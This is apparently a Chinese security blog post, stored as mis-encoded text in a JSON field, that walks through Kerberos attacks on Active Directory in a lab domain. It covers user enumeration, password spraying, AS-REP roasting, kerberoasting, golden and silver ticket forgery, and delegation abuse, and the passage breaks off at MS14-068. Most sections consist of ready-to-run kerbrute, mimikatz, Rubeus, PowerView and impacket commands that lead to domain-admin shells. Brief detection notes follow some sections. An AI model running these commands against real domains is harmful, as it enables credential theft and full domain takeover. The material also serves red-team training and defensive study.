        "content": "kerberosæ”»å‡»ä¸“é¢˜ ç”±äºkerberosåè®®è®¤è¯çš„åŸºç¡€æµç¨‹å‰é¢æ–‡ç« å·²ç»è¯¦ç»†è§£é‡Šäº†ï¼Œè¿™é‡Œå°±ç›´æ¥è¿›å…¥æ”»å‡»é˜¶æ®µ\næ€»çš„æ¥çœ‹kerberoså¯ä»¥å½’ç»“äºä¸¤ä¸ªå­—ï¼šç¥¨æ®ï¼Œå‰é¢æåˆ°äº†å„é˜¶æ®µçš„å®‰å…¨é—®é¢˜ï¼š\nAS-REQé˜¶æ®µ åŸŸå†…ç”¨æˆ·åæšä¸¾ AS-REQä¸­çš„cnameè¡¨ç¤ºè¯·æ±‚çš„ç”¨æˆ·åï¼Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨ä¼šå½±å“è¿”å›åŒ…çš„å†…å®¹ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŸŸå†…ç”¨æˆ·åæšä¸¾\næ–¹æ³• å¯ä»¥ä½¿ç”¨kerbruteè¿›è¡Œæšä¸¾ï¼š ä½¿ç”¨ç¼–è¯‘å¥½çš„å·¥å…·ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€å°ä¸åœ¨åŸŸå†…ï¼ˆå³åŸŸå¤–ï¼‰çš„æœºå™¨ä¸Šå’ŒDCè¿›è¡Œé€šä¿¡çš„æœºå™¨ä¸Šæšä¸¾åŸŸå†…ç”¨æˆ·ï¼š\nkerbrute_windows_amd64.exe userenum --dc 192.168.111.100 -d yuy0ung.com user.txt å½“ç„¶è¿˜æœ‰pythonè„šæœ¬https://github.com/3gstudent/pyKerbrute\nmsfä¸Šä¹Ÿæœ‰kerberos_enumusersæ¨¡å—\næ£€æµ‹ä¸é˜²å¾¡ æµé‡ï¼šæ£€æµ‹åŒä¸€IPçŸ­æ—¶é—´å†…æ˜¯å¦å‘é€äº†å¤§é‡çš„AS-REQåŒ… æ—¥å¿—ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹äºä¸å­˜åœ¨çš„ç”¨æˆ·åå‘èµ·çš„AS-REQåŒ…ä¸ä¼šæœ‰ä»»ä½•è®°å½•ï¼ˆè®°å½•éœ€è¦æ›´æ”¹ç»„ç­–ç•¥ï¼‰ï¼Œæ‰€ä»¥æ—¥å¿—å±‚é¢ä¸å¥½æ£€æµ‹ å¯†ç å–·æ´’ è€Œç”¨æˆ·åå­˜åœ¨æ—¶ï¼Œå¯†ç çš„æ­£ç¡®ä¸å¦ä¹Ÿä¼šå½±å“è¿”å›åŒ…ï¼Œè¿™é‡Œè™½ç„¶å¯ä»¥è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œä½†è¿ç»­é’ˆå¯¹åŒä¸€è´¦æˆ·çš„å¯†ç çŒœæµ‹å¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´è´¦æˆ·è¢«é”å®šï¼Œå› æ­¤æœ‰äº†å¯†ç å–·æ´’å–·æ´’æ”»å‡»ï¼šå³åœ¨çŒœè§£å¯†ç æ—¶ï¼Œä½¿ç”¨æ¯ä¸ªå¯†ç å»å°è¯•æ‰€æœ‰ç”¨æˆ·å\næ–¹æ³• è¯¥æ”»å‡»åŒæ ·å¯ä»¥åœ¨åŸŸå¤–è¿›è¡Œï¼Œä½†å¹¶ä¸æ”¯æŒkerberos\nå¯ä»¥ä½¿ç”¨kerbruteè¿›è¡Œå–·æ´’ï¼š\nkerbrute_windows_amd64.exe passwordspray --dc 192.168.111.100 -d yuy0ung.com user.txt Admin123456 å½“ç„¶ï¼Œå¦‚æœåŸŸæ²¡æœ‰å¯†ç é”å®šç­–ç•¥ï¼Œå¯ä»¥ç›´æ¥å¯¹å•ä¸ªç”¨æˆ·è¿›è¡Œçˆ†ç ´ï¼š\nkerbrute_windows_amd64.exe bruteuser --dc 192.168.111.100 -d yuy0ung.com user.txt pass.txt æ£€æµ‹ä¸é˜²å¾¡ æµé‡ï¼šæ£€æµ‹åŒä¸€IPçŸ­æ—¶é—´å†…æ˜¯å¦å‘é€äº†å¤§é‡çš„AS-REQåŒ… æ—¥å¿—ï¼šç™»å½•æˆåŠŸä¼šäº§ç”Ÿæ—¥å¿—4768ï¼Œä¸”ç»“æœä»£ç ä¸º0x0ï¼Œç™»å½•å¤±è´¥æ—¥å¿—ä¸åšè®°å½• AS-REPé˜¶æ®µ AS-REP Roasting å¯¹äºåŸŸç”¨æˆ·ï¼Œå¦‚æœè®¾ç½®äº†é€‰é¡¹â€ä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€ï¼Œæ­¤æ—¶å‘åŸŸæ§åˆ¶å™¨çš„88ç«¯å£å‘é€AS_REQè¯·æ±‚ï¼Œå¯¹æ”¶åˆ°çš„AS_REPè¯·æ±‚enc-partçš„cipherè¿›è¡Œç»„åˆè§£å¯†å°±èƒ½è·å¾—ç”¨æˆ·çš„æ˜æ–‡ã€‚ï¼ˆenc-partåº•ä¸‹çš„cipherï¼Œè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨ç”¨æˆ·hashåŠ å¯†session-key)\næ–¹æ³• è·å–Hash\nå¯ä»¥ä½¿ç”¨Rbeusè‡ªåŠ¨æœç´¢æ»¡è¶³æ¡ä»¶çš„ç”¨æˆ·ï¼Œå¹¶è·å–login session keyï¼š\nRubeus.exe asreproast /format:john /outfile:hash.txt å†ä½¿ç”¨johnè¿›è¡Œç¦»çº¿ç ´è§£å³å¯ï¼š\njohn --wordlist=/opt/pass.txt hash.txt æ£€æµ‹ä¸é˜²å¾¡ æ£€æµ‹åŸŸä¸­æ˜¯å¦è®¾ç½®äº†â€œä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€ï¼Œå¦‚æœå­˜åœ¨åŠæ—¶å…³é—­ æ—¥å¿—ï¼šé‡ç‚¹å…³æ³¨äº‹ä»¶IDä¸º4768ä¸”é¢„èº«ä»½éªŒè¯ç±»å‹ä¸ºâ€œä¸è¦æ±‚kerberosåŸŸèº«ä»½éªŒè¯â€å±æ€§ç”¨æˆ·å‘èµ·çš„Kerberosè®¤è¯ é»„é‡‘ç¥¨æ®æ”»å‡» åœ¨AS-REPé˜¶æ®µï¼Œè¿”å›çš„TGTçš„åŠ å¯†éƒ¨åˆ†æ˜¯ç”±krbtgtç”¨æˆ·çš„å¯†é’¥åŠ å¯†çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†krbtgtçš„å¯†é’¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªTGTï¼Œè¯¥ç¥¨æ®è¢«ç§°ä¸ºé»„é‡‘ç¥¨æ®\næ”»å‡»éœ€è¦çš„ä¿¡æ¯ï¼šåŸŸåã€åŸŸsidã€krbtgtçš„HTLM hash\nåœ¨DCè¿è¡Œmimikatzï¼š\nmimikatz.exe \u0026#34;Log\u0026#34; \u0026#34;privilege::Debug\u0026#34; \u0026#34;lsadump::lsa /patch\u0026#34; \u0026#34;exit\u0026#34; å¾—åˆ°krbtgtçš„hashä¹‹åï¼Œå…ˆä½¿ç”¨åŸŸæˆå‘˜ä¸»æœºwin10å°è¯•è®¿é—®DCçš„CIFSæœåŠ¡ï¼Œå‘ç°ä¸å¯è®¿é—®ï¼š\ndir \\\\DC01\\c$ åˆ©ç”¨mimikatzç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼š\nkerberos::golden /admin:Administrator /domain:yuy0ung.com /sid: S-1-5-21-593678850-2817278497-901338050 /krbtgt:2b88afb2409dbc10ea5be4f35e497639 /ticket:ticket.kirbi å†å¯¼å…¥ï¼š\nkerberos::ptt ticket.kirbi å†æ¬¡è®¿é—®CIFSæœåŠ¡ï¼š\nå¯ä»¥çœ‹è§æˆåŠŸè®¿é—®äº†\nTGS-REQé˜¶æ®µ kerberoastingæ”»å‡» STæ˜¯ç”¨æœåŠ¡çš„å¯†é’¥åŠ å¯†ï¼Œå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½è·å–åˆ°STï¼Œå°±å¯ä»¥å°è¯•å¯¹STè¿›è¡Œç ´è§£ï¼Œå¾—åˆ°æœåŠ¡çš„å¯†é’¥ï¼Œé€ æˆäº†Kerberoastingæ”»å‡»\nè¿˜æœ‰ä¸€ä¸ªåŸå› æ˜¯å½“ç”¨æˆ·å‘KDCå‘èµ·TGS-REQæ—¶ï¼Œä¸è®ºç”¨æˆ·æ˜¯å¦æœ‰æœåŠ¡çš„è®¿é—®æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼ŒKDCéƒ½ä¼šè¿”å›ST\næ­¥éª¤ æä¾›æ­£å¸¸åŸŸç”¨æˆ·å¯†ç è¿›è¡Œè®¤è¯ï¼Œè·å¾—TGT æ”»å‡»è€…ä½¿ç”¨TGTè¯·æ±‚æŒ‡å®šSPNçš„ST KDCåœ¨éªŒè¯åè¿”å›æœåŠ¡hashåŠ å¯†çš„ST ç¦»çº¿ç ´è§£STï¼Œçˆ†ç ´å‡ºæœåŠ¡çš„æ˜æ–‡å¯†ç  æˆ‘ä»¬éœ€è¦çˆ†ç ´çš„æ˜¯ticketä¸­çš„enc_part,è¿™é‡Œç›´æ¥ä½¿ç”¨å·¥å…·æ¥æå–enc_part\nè‡ªåŠ¨å®ç°å·¥å…·ï¼Œä¸éœ€è¦mimikatzï¼Œæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼šhttps://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921\næå–é«˜æƒé™ç”¨æˆ·IDï¼š\nInvoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation å°†å¾—åˆ°çš„hashå€¼ä¸¢å»hashcatè¿›è¡Œç ´è§£ï¼Œæœ‰æ¦‚ç‡å¾—åˆ°æ˜æ–‡å¯†ç ï¼š\nhashcat -m 13100 hash.txt pass.txt --force æ£€æµ‹ä¸é˜²å¾¡ ç¡®ä¿æœåŠ¡è´¦æˆ·ä¸ºå¼ºå¯†ç ï¼Œå¹¶å®šæœŸä¿®æ”¹ kerberoastingèƒ½æˆåŠŸï¼Œå¾ˆå¤§çš„åŸå› åœ¨äºKDCè¿”å›çš„STæ˜¯ä½¿ç”¨RC4_HMAC_MD5åŠ å¯†çš„ï¼Œèƒ½å¤Ÿæ¯”è¾ƒç®€å•çš„è¿›è¡ŒåŠ å¯†ï¼Œå¦‚æœä½¿ç”¨AES256_HMACæ–¹å¼å¯¹kerberosç¥¨æ®è¿›è¡ŒåŠ å¯†ï¼Œå³ä½¿è·å–äº†STä¹Ÿéš¾ä»¥è§£å¯†ï¼Œä½†æ˜¯è¿™ç§åŠ å¯†å­˜åœ¨ä¸€äº›å…¼å®¹æ€§é—®é¢˜ å¾ˆå¤šæœåŠ¡åœ¨åŸŸä¸­è¢«åˆ†é…äº†è¿‡é«˜çš„æƒé™ï¼Œå¯¼è‡´ç ´è§£äº†è¯¥æœåŠ¡çš„å¯†ç åèƒ½å¤Ÿè¿…é€Ÿå®ç°æƒé™æå‡ï¼Œæ‰€ä»¥é’ˆå¯¹æœ€å¥½é‡‡å–æœ€å°åŒ–æƒé™åŸåˆ™ å¯¹äºæ—¥å¿—å®¡è®¡ï¼Œé‡ç‚¹å…³æ³¨äº‹ä»¶IDä¸º4769ï¼ˆè¯·æ±‚kerberosæœåŠ¡ç¥¨æ®æ“ä½œï¼‰çš„æ—¥å¿—ï¼Œå¦‚æœè¯¥ç±»æ—¥å¿—è¿‡å¤šï¼Œå¯ä»¥ä»ä¸­ç­›é€‰ç¥¨æ®åŠ å¯†ç±»å‹ä¸º0x17ï¼ˆRC4-HMACï¼‰çš„æ—¥å¿— å®šæœŸæ£€æµ‹åŸŸå†…å±é™©çš„SPNå¯ä»¥ä½¿ç”¨å·¥å…·zbang ç™½é“¶ç¥¨æ®æ”»å‡» å› ä¸ºSTæ˜¯ç”¨æœåŠ¡çš„å¯†é’¥åŠ å¯†ï¼Œå¦‚æœæˆ‘ä»¬è·å–åˆ°æœåŠ¡çš„å¯†é’¥ï¼Œå°±å¯ä»¥ç­¾å‘ä»»æ„çš„STï¼Œè¿™ä¸ªç¥¨æ®åˆç§°ä¸ºç™½é“¶ç¥¨æ®ï¼Œå³å®Œæˆäº†ç™½é“¶ç¥¨æ®æ”»å‡»\nåˆ¶ä½œé“¶ç¥¨çš„æ¡ä»¶ï¼š\n1.åŸŸåç§° 2.åŸŸçš„SIDå€¼ 3.åŸŸä¸­çš„ServeræœåŠ¡å™¨è´¦æˆ·çš„NTLM-Hash 4.ä¼ªé€ çš„ç”¨æˆ·åï¼Œå¯ä»¥æ˜¯ä»»æ„ç”¨æˆ·å. 5.ç›®æ ‡æœåŠ¡å™¨ä¸Šé¢çš„kerberosæœåŠ¡ é“¶ç¥¨æœåŠ¡åˆ—è¡¨ï¼š\næœåŠ¡åç§° åŒæ—¶éœ€è¦çš„æœåŠ¡ WMI HOSTã€RPCSS PowerShell Remoting HOSTã€HTTP WinRM HOSTã€HTTP Scheduled Tasks HOST Windows File Share CIFS LDAP LDAP Windows Remote Server RPCSSã€LDAPã€CIFS æ­¥éª¤ åœ¨DCä¸Šä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œmimikatzï¼š\nmimikatz.exe \u0026#34;log\u0026#34; \u0026#34;privilege::debug\u0026#34; \u0026#34;lsadump::dcsync /domain:yuy0ung.com /user:DC01$\u0026#34; è·å–åˆ°åŸŸæ§çš„hashå’ŒåŸŸsidï¼š\nntlm:e70729095731c9b18a2a9ec08092a624 sid:S-1-5-21-593678850-2817278497-901338050 ä¼ªé€ cifsæœåŠ¡ç¥¨æ®ï¼š\nkerberos::golden /domain:yuy0ung.com /sid:S-1-5-21-593678850-2817278497-901338050 /target:DC01.yuy0ung.com /service:cifs /rc4:e70729095731c9b18a2a9ec08092a624 /user:Administrator /ptt å¯ä»¥åœ¨ç¼“å­˜ä¸­æŸ¥çœ‹åˆ°ä¼ªé€ çš„ç¥¨æ®ï¼š\nklist å§”æ´¾ è¿™æ˜¯ä¸€ç§å¤§å‹ç½‘ç»œç»å¸¸éƒ¨ç½²çš„åº”ç”¨æ¨¡å¼ï¼Œç»™å¤šè·³è®¤è¯å¸¦æ¥äº†å¾ˆå¤šä¾¿åˆ©\nä½†éšä¹‹è€Œæ¥çš„æ˜¯å®‰å…¨é—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å§”æ´¾å’Œå…¶ä»–æ¥¼æ ‹æ‰“ç»„åˆæ‹³å®ç°æœ¬åœ°ææƒç”šè‡³æ˜¯åŸŸå†…ææƒï¼Œè¿˜å¯ä»¥åˆ¶ä½œæ·±åº¦éšè—çš„åé—¨\nä¸¾ä¸ªä¾‹å­ï¼š\nYuy0ungç»è¿‡kerberoséªŒè¯è®¿é—®webserverä¸‹è½½æ–‡ä»¶ï¼Œä½†æ–‡ä»¶å®é™…å­˜åœ¨äºåå°çš„æ–‡ä»¶æœåŠ¡å™¨ä¸Šï¼Œäºæ˜¯webserveræ¨¡æ‹ŸYuy0ungçš„èº«ä»½ç»§ç»­ä»¥kerberosåè®®è®¤è¯åˆ°æ–‡ä»¶æœåŠ¡å™¨ï¼Œæ–‡ä»¶æœåŠ¡å™¨è¿”å›æ–‡ä»¶ç»™webserverï¼Œwebserveråœ¨è¿”å›æ–‡ä»¶ç»™Yuy0ungï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå§”æ´¾çš„æµç¨‹\nåœ¨åŸŸä¸­ï¼Œåªæœ‰ä¸»æœºè´¦æˆ·ï¼ˆæœºå™¨è´¦æˆ·ï¼‰å’ŒæœåŠ¡è´¦æˆ·ï¼ˆï¼‰å…·æœ‰å§”æ´¾å±æ€§\néçº¦æŸæ€§å§”æ´¾ æœåŠ¡è´¦æˆ·å¯ä»¥è·å–è¢«å§”æ´¾ç”¨æˆ·çš„TGTï¼Œå¹¶å°†TGTç¼“å­˜åˆ°lsassè¿›ç¨‹ä¸­ï¼Œè¿›è€ŒæœåŠ¡è´¦æˆ·å¯ä»¥ç”¨è¯¥TGTæ¨¡æ‹Ÿè¯¥ç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡\néçº¦æŸæ€§å§”æ´¾éœ€è¦çš„SeEnableDelegationPrivilegeç‰¹æƒé»˜è®¤ä»…æˆäºˆåŸŸç®¡ç†å‘˜å’Œä¼ä¸šç®¡ç†å‘˜\nå¤§è‡´æµç¨‹ï¼š\nå¦‚ä¸Šå›¾ï¼Œä»æ”»å‡»è€…è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ§åˆ¶äº†æœåŠ¡1ï¼Œé‚£ä¹ˆå½“ç®¡ç†å‘˜è®¿é—®äº†æœåŠ¡1ï¼Œä¾¿å¯ä»¥åœ¨æœåŠ¡1ä¸Šè·å–ç®¡ç†å‘˜TGTï¼Œä»¥æ­¤è®¿é—®ä»»æ„æœåŠ¡åŒ…æ‹¬åŸŸæ§\nå¯ä»¥ä½¿ç”¨adfindåœ¨åŸŸå†…ä¸»æœºæŸ¥æ‰¾éçº¦æŸæ€§å§”æ´¾ç”¨æˆ·ï¼š\nAdfind.exe -b \u0026#34;DC=yuy0ung,DC=com\u0026#34; -f \u0026#34;(\u0026amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\u0026#34; cn distinguishedName #æœåŠ¡è´¦æˆ· (\u0026amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288)) #æœºå™¨è´¦æˆ· (\u0026amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) å¦‚æœåŸŸç®¡è®¿é—®è¿‡æœåŠ¡ç›´æ¥å°±èƒ½æ‹¿åˆ°å‡­æ®ï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::tickets /export\u0026#34; \u0026#34;exit\u0026#34; ä½†ä¸Šé¢çš„æ–¹æ³•å¾ˆå±€é™ï¼Œå¿…é¡»è®©ç®¡ç†å‘˜è®¿é—®æŒ‡å®šæœåŠ¡\nç‰¹å®šæƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨Spooleræ‰“å°æœºæœåŠ¡è®©åŸŸæ§ä¸»åŠ¨è¿æ¥ï¼Œå³å¼ºè¿«è¿è¡Œæ‰“å°æœåŠ¡ï¼ˆPrint Spoolerï¼‰çš„ä¸»æœºå‘ç›®æ ‡ä¸»æœºå‘èµ· Kerberos æˆ– NTLM è®¤è¯è¯·æ±‚\nåŸŸæˆå‘˜ä¸»æœºä¸Šï¼Œä»¥ç®¡ç†å‘˜æƒé™å¯åŠ¨Rubeusç›‘å¬ï¼š\nRubeus.exe monitor /interval:1 /filteruser:DC01$ åˆ©ç”¨SpoolSampleï¼ˆè¯¦è§githubï¼‰å¼ºåˆ¶DCå¯¹æœ¬æœºè¿›è¡Œè®¤è¯ï¼Œå³å¯æŠ“å–åˆ°TGT\nå¯¼å…¥TGTï¼š\nRubeus.exe ptt /ticket:base64 åˆ©ç”¨mimikatzè¿›è¡Œdcsyncå³å¯è·å–hashï¼Œåˆ¶ä½œé»„é‡‘ç¥¨æ®æ¥ç®¡åŸŸæ§\nè¿™é‡Œè·å–çš„TGTå®é™…ä¸Šæ˜¯DCçš„æœºå™¨è´¦æˆ·ï¼Œæœºå™¨è´¦æˆ·æ²¡æœ‰è®¿é—®CIFSçš„æƒé™ï¼Œä½†æ˜¯åœ¨LDAPä¸­ä¼šè¢«å½“åšåŸŸæ§ï¼Œå¯ä»¥å°è¯•dcsync\nå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥mimikatzå¯¼å‡ºç¥¨æ®\nçº¦æŸæ€§å§”æ´¾ ç”±äºéçº¦æŸæ€§å§”æ´¾çš„ä¸å®‰å…¨æ€§ï¼Œå¾®è½¯å‘å¸ƒäº†çº¦æŸæ€§å§”æ´¾ï¼Œå¯¹kerberoså¼•å…¥S4U\nå¯¹äºçº¦æŸæ€§å§”æ´¾ï¼ŒæœåŠ¡è´¦æˆ·åªèƒ½è·å–è¯¥ç”¨æˆ·å¯¹æŒ‡å®šæœåŠ¡çš„STï¼Œä»è€Œåªèƒ½æ¨¡æ‹Ÿè¯¥ç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡\næ­¥éª¤ï¼š\nè¿™é‡Œï¼Œçº¦æŸå§”æ´¾çš„å‰ç½®æ¡ä»¶æ˜¯æœåŠ¡è‡ªèº«éœ€è¦é€šè¿‡KDCè®¤è¯çš„TGT\næ”»å‡»è§’åº¦ä¸Šçœ‹ï¼Œå¦‚æœè·å–äº†æœåŠ¡1çš„æƒé™ï¼Œå°±å¯ä»¥ä¼ªé€ S4Uå…ˆè¯·æ±‚è‡ªèº«çš„STï¼Œåˆ©ç”¨æ­¤STä¾¿å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·è¯·æ±‚æ¥è·å–æœåŠ¡2çš„ST\nadfindå¯»æ‰¾çº¦æŸæ€§å§”æ´¾ä¸»æœºï¼š\nAdFind.exe -b \u0026#34;DC=redteam,DC=red\u0026#34; -f \u0026#34;(\u0026amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))\u0026#34; cn distinguishedName msds-allowedtodelegateto ä»¥client02å¯¹DC01çš„CIFSæœåŠ¡å­˜åœ¨çº¦æŸå§”æ´¾ä¸ºä¾‹\nåœ¨çŸ¥é“æœåŠ¡ç”¨æˆ·hashçš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨kekeoè¯·æ±‚client02çš„TGTï¼š\ntgt::ask /user:client02 /domain:yuy0ung.com /NTLM:\u0026lt;æœåŠ¡hash\u0026gt; /ticket:s4u.kirbi ä¼ªé€ S4Uè¯·æ±‚ï¼Œä»¥administratoræƒé™è®¿é—®å—å§”æ´¾çš„CIFSæœåŠ¡ï¼š\ntgs:: s4u /tgt:TGT_client02@YUY0UNG.COM_krbtgt~yuy0ung.com@YUY0UNG.COM.kirbi /user:Administrator/service:cifs/dc01.yuy0ung.com åˆ©ç”¨mimikatzå¯¼å…¥S4U2proxyé˜¶æ®µç”Ÿæˆçš„STå³å¯è®¿é—®CTFSæœåŠ¡\nå½“ç„¶è¿˜å¯ä»¥åˆ©ç”¨Rubeusæ›´æ–¹ä¾¿æˆ–ä½¿ç”¨impacketå¥—ä»¶èƒ½ç›´æ¥è·å¾—shell\nåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ ä¸éœ€è¦åŸŸç®¡ç†å‘˜è®¾ç½®ï¼Œè€Œæ˜¯æŠŠè®¾ç½®å±æ€§çš„æƒé™èµ‹äºˆäº†æœºå™¨è‡ªèº«\nåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œä¸éœ€è¦ä¼ ç»Ÿçº¦æŸå§”æ´¾çš„é«˜é…ç½®æƒé™(SeEnableDelegationæƒé™),å¦‚æœæˆ‘ä»¬æœ‰æœåŠ¡è´¦æˆ·1ï¼Œåªéœ€è¦å…·å¤‡æœåŠ¡è´¦æˆ·2çš„ldapæƒé™ï¼ŒæœåŠ¡1å°±èƒ½æ§åˆ¶æœåŠ¡2ï¼Œè¿™ä¸€æ­¥éœ€è¦é…ç½®æœåŠ¡2çš„MSDS-AllowedToActOnBehalfOfOtherIdentityæŒ‡å‘æœåŠ¡1çš„sid\nåŸºäºèµ„æºçš„çº¦æŸæ€§å§”S4U2selfé˜¶æ®µçš„STæ˜¯ä¸å¯è½¬å‘çš„\nä»æ”»å‡»è§†è§’æ¥çœ‹ï¼š\næœ‰ä¸€ä¸ªæœåŠ¡è´¦æˆ·1/æœºå™¨è´¦æˆ·(æŠŠåŸŸå†…æœºå™¨ææƒåˆ°SYSTEMç›¸å½“äºæœ‰äº†ä¸€ä¸ªè´¦æˆ·)ï¼Œå¦‚æœæˆ‘ä»¬åªæœ‰æ™®é€šçš„åŸŸå†…ç”¨æˆ·ï¼Œå¯ä»¥æ»¥ç”¨MachineAccountQuotaã€‚ è·å–æœåŠ¡è´¦æˆ·2çš„LDAPæƒé™ é…ç½®æœåŠ¡1å¯¹æœåŠ¡2çš„åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œå¯¹æœåŠ¡2æ·»åŠ sidçš„æŒ‡å‘ å‘èµ·ä¸€ä¸ªæœåŠ¡1åˆ°æœåŠ¡2çš„æ­£å¸¸çº¦æŸå§”æ´¾æµç¨‹ï¼Œä»è€Œè®¿é—®æœåŠ¡2 é‚£ä¹ˆé¦–å…ˆæ˜¯æ‰¾åˆ°å¯ä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentityçš„ç”¨æˆ·\nå·²çŸ¥æœºå™¨è´¦æˆ·ï¼Œæ‰¾åˆ°ä½¿å…¶åŠ å…¥åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ï¼Œè¿™ä¸ªç”¨æˆ·è´¦æˆ·å°±å…·å¤‡ä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentityçš„æƒé™ï¼š\n# ä½¿ç”¨adfind.exeæŸ¥æ‰¾æœºå™¨è´¦æˆ·çš„mS-DS-CreatorSIDå±æ€§ AdFind.exe -h 192.168.30.10 -b \u0026#34;DC=hack,DC=com\u0026#34; -f \u0026#34;objectClass=computer\u0026#34; mS-DS-CreatorSID # ä½¿ç”¨PowershellåæŸ¥SIDå¯¹åº”çš„ç”¨æˆ· powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier SIF-VALUEs;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value ç”±ç”¨æˆ·æŸ¥è¯¢å…¶åŠ å…¥åŸŸä¸­çš„æœºå™¨\nå·²çŸ¥ç”¨æˆ·æŸ¥æ‰¾åˆ°é€šè¿‡è¯¥ç”¨æˆ·åŠ å…¥åŸŸä¸­çš„æœºå™¨\n# æŸ¥ç”¨æˆ·è´¦æˆ·SID whoami /all # ä½¿ç”¨PowerViewæŸ¥ç»ç”±è¯¥ç”¨æˆ·åŠ å…¥åŸŸå†…çš„æœºå™¨è´¦æˆ·(ä¸»æœº) # éœ€è¦å…·å¤‡GeneriCallæˆ–WritePropertyç­‰ä¿®æ”¹æƒé™ import-module PowerView.ps1 Get-DomainObejctAcl -Identity PC | ?{$_.SecurityIdentifier -match \u0026#34;S-1-5-21-754643614-3937478331-2139222398-1116\u0026#34;} æ”»å‡»ï¼š\npowermadåˆ›å»ºç”¨æˆ·\nimport-moduel powermad.ps1 New-MachineAccount -MachineAccount testv -Password $(ConvertTo-SecureString \u0026#34;!qaz@WSX\u0026#34; -AsPlainText -Force) ä¸ºç›®æ ‡ä¸»æœºæ·»åŠ èµ„æºå§”æ´¾ï¼ŒæŒ‡å‘æ–°å»ºæœºå™¨è´¦æˆ·çš„sidï¼š\n#æŸ¥è¯¢è¯¥æœºå™¨è´¦æˆ·çš„sid,ä½¿ç”¨powerview Get-NetComputer testv -Properties objectsid objectsid --------- S-1-5-21-754643614-3937478331-2139222398-1122 #é…ç½®testvåˆ°PCçš„åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ï¼Œå³ä¿®æ”¹PCçš„å±æ€§æŒ‡å‘testvçš„sid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-754643614-3937478331-2139222398-1122)\u0026#34;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer PC | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} -Verbose #æŸ¥è¯¢ä¸€ä¸‹æ˜¯å¦æ·»åŠ æˆåŠŸ Get-DomainComputer PC -Properties msds-allowedtoactonbehalfofotheridentity åˆ©ç”¨rubeusç”³è¯·ç¥¨æ®ï¼š\n# é€šè¿‡Rubeusç”³è¯·æœºå™¨è´¦æˆ·testv$çš„TGT Rubeus.exe asktgt /user:testv$ /password:!qaz@WSX /domain:hack.com /dc:DC.hack.com /nowrap /outfile:testv.kirbi # ä½¿ç”¨S4U2Selfåè®®ç”³è¯·TGSå¹¶ä¸”ä½¿ç”¨S4U2Proxyåè®®è¯·æ±‚cifsæœåŠ¡ç¥¨æ®STï¼Œæ³¨å…¥å†…å­˜ä¸­ Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/PC.hack.com /dc:DC.hack.com /nowrap /ptt /ticket:your-ticket å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨impacketï¼š\n# ä½¿ç”¨getST.pyç”³è¯·ç¥¨æ® python3 getST.py hack.com/testv$:\\!qaz@WSX -spn cifs/PC.hack.com -impersonate administrator -dc-ip \u0026lt;ip\u0026gt; # å¯¼å…¥ç¥¨æ® export KRB5CCNAME=administrator.ccache # ç›´æ¥ç™»å½• python3 wmiexec.py -k PC.hack.com -no-pass -dc-ip \u0026lt;ip\u0026gt; python3 psexec.py -k PC.hack.com -no-pass -dc-ip \u0026lt;ip\u0026gt; æ­¤æ—¶èƒ½å¤Ÿè®¿é—®cifsæœåŠ¡äº†ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨psexecè¿›è¡Œè¿æ¥è·å–é«˜æƒé™shell\nPAC MS14-068 è¿™æ˜¯ä¸€ä¸ªåŸŸå†…ææƒæ¼æ´\næ¼æ´æˆå› æ˜¯KDCæ— æ³•æ­£ç¡®æ£€æŸ¥PACä¸­çš„æœ‰æ•ˆç­¾åï¼Œå› ä¸ºPACç­¾åå®ç°çš„åŠ 